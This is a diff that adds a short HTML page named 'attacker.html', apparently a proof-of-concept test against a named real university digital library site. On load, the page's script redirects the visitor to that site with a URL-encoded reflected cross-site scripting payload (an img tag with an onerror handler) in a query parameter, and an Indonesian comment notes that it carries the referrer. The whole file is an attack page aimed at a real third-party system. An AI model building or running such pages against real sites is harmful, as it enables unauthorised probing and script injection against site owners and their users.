@@ -1,0 +1,14 @@
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Redirect Test</title>
+    </head>
+    <body>
+        <a href="https://digilib.ulm.ac.id/archive/">Click to test</a>
+        <script>
+            // ini akan otomatis redirect ke target sambil membawa referrer
+            window.location = "https://digilib.ulm.ac.id/archive/?test=testing123%3Cimg%20src%3Dx%20onerror%3Dconsole.log('referrer')%3E";
+        </script>
+    </body>
+</html>
